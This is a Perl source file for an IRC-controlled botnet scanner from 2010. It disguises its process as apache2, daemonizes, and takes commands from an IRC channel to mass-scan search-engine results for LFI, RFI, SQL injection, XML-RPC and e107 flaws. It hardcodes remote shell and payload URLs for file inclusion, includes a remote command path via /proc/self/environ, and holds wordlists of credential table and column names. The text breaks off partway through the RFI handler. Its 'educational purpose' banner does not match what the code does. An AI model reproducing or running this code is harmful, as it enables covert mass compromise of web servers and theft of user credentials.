#!/usr/bin/perl
$powered="BaMbY";
$mail="admin(at)bamby.web.id";
  #####################################################################################
  ##                                                                                 ##
  ##                                                                   17/06/2010    ##
  ##  Author  : BaMbY, Voo_Doo                                                       ##
  ##  Team    : Irc.Byroe.Net                                                        ##
  ##                                                                                 ##
  ##  ## IMPORTANT ##                                                                ##
  ##   # ONLY FOR EDUCATIONAL PURPOSE. THE AUTHOR IS NOT RESPONSABLE OF ANY          ##
  ##   # IMPROPERLY USE OF THIS TOOL. USE IT AT YOUR OWN RISK !!                     ##
  ##   # THIS TOOL HAS BEEN MADE TO HELP NET ADMINISTRATORS TO MAKE THEIR            ##
  ##   # SYSTEM MORE SECURE.                                                         ##
  ##  ##                                                                             ##
  ##                                                                                 ##
  ##  Features:                                                                      ##
  ##    [+]e107 Injection Scanner                                                    ##
  ##    [+]Sql Injection Scanner                                                     ##
  ##    [+]XML (Extensible Markup Language) Injection Scanner                        ##
  ##    [+]Remote File Inclusion Scanner                                             ##
  ##    [+]Local File Inclusion Scanner                                              ##
  ##    [+]Integrated Shell, so you can execute commands on the server               ##
  ##    [+]Spread Mode, to activate or disable Spread Function                       ##
  ##                                                                                 ##
  #####################################################################################
use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use IO::Socket::INET;
use Socket;
use HTTP::Request::Common;
use LWP::Simple;
use LWP 5.64;
use HTTP::Request::Common qw(POST);
use Digest::MD5 qw(md5_hex);
use MIME::Base64;
my $fakeproc  	= "/usr/sbin/apache2 -k start"; 
$ircserver    	= "irc.telkom.net.id";
my $ircport   	= "80";
my $nickname  	= "AyUmi";
my $ident     	= "hamazaki";
my $channel   	= "#jw";
my $runner    	= "kenzhi";
my $fullname  	= 'New ByroeNet Private Scanner';
my $lfi   	  	= "!lfi";
my $xml		  	= "!xml";
my $e107		= "!e107";
my $sql		  	= "!sql";
my $rfi		  	= "!rfi";
my $encrypt     = "!enc";
my $decrypt     = "!dec";
my $zip         = "!zip";
my $fullport    = "!nmap";
my $shell   	= "http://125.245.186.140/home/2??";
my $rfiid   	= "http://hbbb.com.au/.../id2.jpg?";
my $perl   	    = "http://jgv.fileave.com/a.txt?";
my $php   	    = "http://jgv.fileave.com/pdosa.txt?";
my @tabele		= ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
					'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',
					'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',
					'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',
					'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
					'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
					'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',
					'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',
					'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',
					'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');
my @kolumny		= ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
					'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
					'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
					'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
					'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
					'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');
my @User_Agent  = &Agent();
$SIG{'INT'}   	= 'IGNORE';
$SIG{'HUP'}   	= 'IGNORE';
$SIG{'TERM'}  	= 'IGNORE';
$SIG{'CHLD'}  	= 'IGNORE';
$SIG{'PS'}    	= 'IGNORE';
chdir("/tmp");
$ircserver="$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0"x16;;
&SIGN();
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);
our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep 1;
    }
}
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
        my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
        if ($args =~ /^\001VERSION\001$/) {
            notice("$pn", "\001VERSION mIRC v6.35 Khaled Mardam-Bey\001");
        }
        if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
        }
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick=$4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick|".int rand(9999));
    } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $nickname +Bx");
        sendraw("JOIN $channel");
        sendraw("PRIVMSG $channel :Hello, I`m Ready To Scanner");
        sendraw("PRIVMSG $runner :Hi $runner im here !!!");
    }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $msg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $msg);
        $msg =~ s/\r\n$//;
        if ($msg=~ /PRIVMSG $channel :!help/){
	        sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Help2] 10 Scanner : $rfi | $lfi | $sql | $xml | $e107 [bug] [dork] ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Help2] 10 Remote  : !cmde107 | !cmdlfi | !cmdxml [target] [cmd] ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Help2] 10 Utility : !dns | !port | !nmap | !ip | !zip ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Help2] 10 Proxy   : !us/uk/euproxy [port] [type]  ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Help2] 10 Crypt   : !enc | !dec | !base64");
        }
        if ($msg=~ /PRIVMSG $channel :!version/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Version2]10 Multi Vuln Scanner v2");
        }
        if ($msg=~ /PRIVMSG $channel :!engine/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Engine2]13-> 2[9@4Google2][9@4Google22][9@4Alltheweb2][9@4Altavista2][9@4Ask2][9@4Aol2][9@4Uol2][9@4Bing2][9@4Msn2][9@4Yahoo2][9@4Onet2][9@4Naver2][9@4Sapo2][9@4GoodSearch2][9@4Seznam2][9@4Szukacz2][9@4Lycos2][9@4Witch2][9@4Search2]");
        }
        if ($msg=~ /PRIVMSG $channel :!pid/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Pid2]10 Process/ID : 4 $fakeproc - $$");
        }
        if ($msg=~ /PRIVMSG $channel :!about/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4About2]3 Multi Vuln Scanner Moded Version");
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4About2]3 Coded by BambyModed by Van_Persie ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4About2]3 Copyright 2010 ByroeNet");
        }
        ##################################################################### CMD IRC
		if ($msg=~ /PRIVMSG $channel :!bjoin\s+(.*)/){
			my $cnls = $1;
			&join($cnls);
		}
		if ($msg=~ /PRIVMSG $channel :!bpart\s+(.*)/){
			my $cnls = $1;
			&part($cnls);
		}
		if ($msg=~ /PRIVMSG $channel :!micex\s+(.*)/){
			my $cnls = $1;
			&quit($cnls);
		}
		if ($msg=~ /PRIVMSG $channel :$encrypt\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					&encrypt($1);
				}
				exit;
			}
		}
		if ($msg=~ /PRIVMSG $channel :$decrypt\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					&decrypt($1);
				}
				exit;
			}
		}
		if ($msg=~ /PRIVMSG $channel :!usproxy\s+(.*?)\s+(.*)/){
			my $port = $1;
			my $type = $2;
			&usproxy($port,$type);
		}
		if ($msg=~ /PRIVMSG $channel :!ukproxy\s+(.*?)\s+(.*)/){
			my $port = $1;
			my $type = $2;
			&ukproxy($port,$type);
		}
		if ($msg=~ /PRIVMSG $channel :!euproxy\s+(.*?)\s+(.*)/){
			my $port = $1;
			my $type = $2;
			&euproxy($port,$type);
		}
		if ($msg=~ /PRIVMSG $channel :!dns\s+(.*)/){
			my $nsku = $1;
			$mydns = inet_ntoa(inet_aton($nsku));
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Dns2]3 $nsku <=> $mydns");
		}
		if ($msg=~ /PRIVMSG $channel :!port\s+(.*?)\s+(.*)/ ) {
            my $hostip= "$1";
            my $portsc= "$2";
            my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 5);
            if ($scansock) {
	            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Port2]14 Chacking $hostip:$portsc 2[9@4Accepted2]");}
            else {
                sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Port2]14 Chacking $hostip:$portsc 2[9@4Refused2]");}
        }
		if ($msg=~ /PRIVMSG $channel :!respon/){
			my $re = query($rfiid);
			if ( $re =~ /ByroeNet/ ) {
                sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Respon2]3 Response is working !");
            }
            else {
                sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Respon2]3 Response is 4NOT3 working !");
            }
        }
        ##################################################################### CMD LFI
		if ($msg=~ /PRIVMSG $channel :!cmdlfi\s+(.*?)\s+(.*)/){
			my $url = $1."../../../../../../../../../../../../../../../proc/self/environ%00";
			my $cmd = $2;
			&cmdlfi($url,$cmd);
		}
        #####################################################################
        #####################         LFI LFI LFI         ###################
        ##################################################################### Google Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4LFI2]10 Dork :4 $d0rk");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4LFI2]10 File :4 $bugx");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4LFI2]7 Search Engine Loading ...");
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google2";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### alltheweb Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "alltheweb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Virgillio";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### altavista Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "altavista";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### naver Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "naver";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### onet Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "onet";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### sapo Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "sapo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### search Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "search";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### msn Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "msn";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### lycos Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "lycos";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### snz Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "snz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### witch Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "witch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### seznam Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "seznam";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### goodsearch Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "goodsearch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### hotbot Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "hotbot";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        #####################################################################
        #####################         XML XML XML         ###################
		#####################################################################
		if ($msg=~ /PRIVMSG $channel :!cmdxml\s+(.*?)\s+(.*)/){
			my $url = $1;
			my $cmd = $2;
			&cmdxml($url,$cmd);
		}
        ##################################################################### google Engine		
		if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4XML2]10 Dork :4 $d0rk");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4XML2]10 File :4 $bugx");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4XML2]7 Search Engine Loading ...");
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google2";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### alltheweb Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "alltheweb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Virgillio";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### altavista Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "altavista";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
        ##################################################################### naver Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "naver";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
        ##################################################################### onet Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "onet";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### sapo Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "sapo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### search Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "search";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### msn Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "msn";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### lycos Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "lycos";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### snz Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "snz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### witch Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "witch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### seznam Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "seznam";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### goodsearch Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "goodsearch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### hotbot Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "hotbot";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

		#####################################################################
        #####################         RFI RFI RFI         ###################
        ##################################################################### google Engine		
		
		if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4RFI2]10 Dork :4 $d0rk");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4RFI2]10 File :4 $bugx");
